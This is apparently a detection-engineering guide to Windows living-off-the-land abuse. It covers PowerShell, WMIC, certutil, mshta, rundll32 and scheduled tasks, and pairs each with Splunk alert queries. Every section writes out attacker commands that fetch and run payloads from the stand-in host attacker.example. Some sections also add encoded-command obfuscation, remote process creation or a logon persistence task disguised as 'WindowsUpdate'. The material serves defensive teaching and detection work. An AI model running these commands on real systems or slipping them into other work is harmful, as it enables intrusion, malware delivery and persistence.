# Windows 

### Powershell

```powershell
PS C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
PS C:\> powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...
PS C:\> powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

In the above example, the first command uses the IEX (DownloadString) pattern to let an attacker fetch a script from a remote server and run it immediately in memory, avoiding disk artefacts and slowing detection.  In the second command, -EncodedCommand hides the payload in base64, so human reviewers and simple log filters may miss the intent. Finally, it downloads and executes the file.exe.

An example detection is shown below:

`index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine`

### WMIC

```powershell
PS C:\> wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
PS C:\> wmic /node:TARGETHOST process get name,commandline
PS C:\> wmic process call create "notepad.exe" /hidden
```

In the first WMIC command, the operator targets a remote host and requests that the remote system create a new process. That new process is a PowerShell instance that downloads and executes a remote script, so WMIC acts as a remote launcher. Then, in the second WMIC command, the tool queries the remote system for its running processes and command lines, returning structured info useful for reconnaissance across hosts.
In the third WMIC command, the local WMIC process call create API is used to spawn notepad.exe On the same machine, the optional hiding flag demonstrates how an attacker might try to make a spawned process less visible.

An example detection alert can be found below:

`index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine`

### Certutil

```powershell
PS C:\> certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe
PS C:\> certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe
PS C:\> certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
```

In the first certutil command, the -urlcache -split -f flags instruct certutil to fetch the remote URL and write it to the specified local path; the result is a file dropped on disk that can be executed later.
In the second command, certutil reads a base64 text file encoded.b64, decodes it, and writes the resulting binary to decoded.exe, so an attacker can transport a binary as text, then reconstruct it on the host.
In the third command, certutil encodes an existing binary into base64 text stored in payload.b64. This can be used to obfuscate the payload during staging or transit.

Example alert:

`index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine`

### MSHTA

Mshta runs HTML Application (HTA) files, which can contain VBScript or JavaScript code.
```powershell
PS C:\> mshta "http://attacker.example/payload.hta"
PS C:\> mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"
PS C:\> mshta "C:\Users\Public\malicious.hta"
```

In the first mshta command, mshta loads the HTA from a remote server and executes the HTA content in the host context.
In the second mshta command mshta is passed an inline javascript URI that creates a WScript.Shell ActiveX object and uses it to run PowerShell, which then starts a process, this shows how inline script can directly spawn system commands without a saved intermediary.
In the third mshta command, mshta runs a local HTA file, useful when the attacker delivers the HTA as an attachment or drops it on a shared drive.

Example alert:

`index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLine`

### Rundll32

Rundll32 executes specific exported functions from DLL files.

```powershell
PS C:\> rundll32.exe C:\Users\Public\backdoor.dll,Start
PS C:\> rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"
PS C:\> rundll32.exe C:\Windows\Temp\loader.dll,Run
```

In the first rundll32 command, rundll32 loads the specified DLL and calls its exported Start function, which runs the DLL's code.
In the second rundll32 command, rundll32 invokes url.dll with FileProtocolHandler and a remote URL, causing the system handler to process the remote content, which can bootstrap further activity.
The third rundll32 command is called a crafted export in a temporary DLL, which may execute embedded loader logic or shellcode from a file placed in a writable location.

Example alert:

`index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine`

### Scheduled tasks (schtasks / Task Scheduler)

```powershell
PS C:\> schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""
PS C:\> schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05
PS C:\> schtasks /Run /TN "WindowsUpdate"
```
In the first schtasks command, a task named WindowsUpdate is created to run at logon. The action runs PowerShell, which downloads and executes a remote script on each user logon, providing persistence.
In the second schtasks command a daily task named DailyJob is scheduled to run a local script at 00:05 each day, this can automate repeated harmful actions like scheduled encryption or staged data collection.
In the third schtasks command, the attacker triggers the named task to run immediately, invoking its configured action on demand.

Example Alert:

`index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine`
